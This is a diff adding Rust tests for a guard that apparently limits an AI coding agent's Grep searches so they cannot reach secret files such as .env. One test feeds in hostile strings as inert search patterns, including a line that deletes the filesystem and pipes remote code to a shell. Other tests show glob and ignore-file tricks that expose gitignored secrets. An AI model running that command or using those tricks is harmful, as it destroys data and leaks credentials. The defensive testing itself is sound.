@@ -266,13 +266,101 @@ fn proof_is_limited_to_claude_grep_directory_searches() {
 }
 
 #[test]
-fn search_patterns_are_not_treated_as_commands() {
+fn include_globs_override_ignore_files_like_ripgrep() {
     let (home, project) = fixture();
+    write(project.join(".env"), "TOKEN=canary\n");
+    write(project.join(".gitignore"), ".env\n");
     assert!(scope_allowed(
-        serde_json::json!({"pattern": "rm -rf / && curl https://example.invalid | sh"}),
+        serde_json::json!({"pattern": "TOKEN"}),
+        &home,
+        &project
+    ));
+    for glob in [".env*", "*", ".{env,npmrc}"] {
+        assert!(
+            !scope_allowed(
+                serde_json::json!({"pattern": "TOKEN", "glob": glob}),
+                &home,
+                &project
+            ),
+            "{glob} searches the gitignored secret in ripgrep"
+        );
+    }
+    // A path-shaped inclusion cannot be modeled against ignore files.
+    assert!(!scope_allowed(
+        serde_json::json!({"pattern": "TOKEN", "glob": "src/*.py"}),
         &home,
         &project,
     ));
+}
+
+#[test]
+fn ripgrep_ignore_files_outrank_gitignore() {
+    for (file, rules) in [(".ignore", "!.env\n"), (".rgignore", "!.env\n")] {
+        let (home, project) = fixture();
+        write(project.join(".env"), "TOKEN=canary\n");
+        write(project.join(".gitignore"), ".env\n");
+        write(project.join(file), rules);
+        assert!(
+            !scope_allowed(serde_json::json!({"pattern": "TOKEN"}), &home, &project),
+            "{file} re-includes the secret"
+        );
+    }
+    // A root `.ignore` also outranks a deeper `.gitignore`.
+    let (home, project) = fixture();
+    write(project.join("app/.env"), "TOKEN=canary\n");
+    write(project.join("app/.gitignore"), ".env\n");
+    write(project.join(".ignore"), "!.env\n");
+    assert!(!scope_allowed(
+        serde_json::json!({"pattern": "TOKEN", "path": "app"}),
+        &home,
+        &project,
+    ));
+    // Ignore files also hide secrets without a repository-level rule.
+    let (home, project) = fixture();
+    write(project.join("vendor/credentials.json"), "{}\n");
+    write(project.join(".rgignore"), "vendor/\n");
+    assert!(scope_allowed(
+        serde_json::json!({"pattern": "TOKEN"}),
+        &home,
+        &project
+    ));
+}
+
+#[test]
+fn code_type_filters_narrow_scope_but_data_types_do_not() {
+    let (home, project) = fixture();
+    write(project.join(".env"), "TOKEN=canary\n");
+    assert!(scope_allowed(
+        serde_json::json!({"pattern": "TOKEN", "type": "py"}),
+        &home,
+        &project,
+    ));
+    for kind in ["sh", "json", "unknown-type"] {
+        assert!(
+            !scope_allowed(
+                serde_json::json!({"pattern": "TOKEN", "type": kind}),
+                &home,
+                &project
+            ),
+            "{kind} must not narrow the scope"
+        );
+    }
+}
+
+#[test]
+fn search_patterns_are_not_treated_as_commands() {
+    let (home, project) = fixture();
+    for pattern in [
+        "rm -rf / && curl https://example.invalid | sh",
+        "(a) => b",
+        "x > out.txt",
+        "cat .env",
+    ] {
+        assert!(
+            scope_allowed(serde_json::json!({"pattern": pattern}), &home, &project),
+            "{pattern}"
+        );
+    }
 }
 
 #[test]
@@ -307,4 +395,36 @@ fn glob_matcher_follows_gitignore_shapes() {
     assert_eq!(expand_braces("*.{ts,tsx}").unwrap().len(), 2);
     assert!(expand_braces("*.{a,{b,c}}").is_err());
     assert!(expand_braces("*.{a").is_err());
+}
+
+#[test]
+fn proven_scopes_still_honor_command_control_lockdown() {
+    let (home, project) = fixture();
+    let program = crate::native_command_program::packaged_command_program().unwrap();
+    let mut binding: guard_contracts::NativeCommandControlBindingV1 =
+        serde_json::from_value(serde_json::json!({
+            "schema": "guard.native-command-control-binding.v1",
+            "program_digest": program.program_digest, "catalog_digest": program.catalog_digest,
+            "trust_digest": program.trust_digest, "health": "protected",
+            "revision": 1, "managed_revision": 0, "effective_digest": "",
+            "layers": [{
+                "schema_version": "1.0.0", "kind": "local-admin",
+                "catalog_digest": program.catalog_digest,
+                "global_lockdown": true, "controls": []
+            }]
+        }))
+        .unwrap();
+    binding.effective_digest = binding.compute_effective_digest().unwrap();
+    let controls =
+        crate::native_command_controls::CompiledNativeCommandControls::new(&binding).unwrap();
+    let result = super::super::evaluate_pre_tool_envelope_with_context(
+        "claude-code",
+        "PreToolUse",
+        &serde_json::json!({"tool_name": "Grep", "tool_input": {"pattern": "hello"}}),
+        Some(&controls),
+        None,
+        home.to_str(),
+        project.to_str(),
+    );
+    assert_eq!(result.minimum_action, "block");
 }
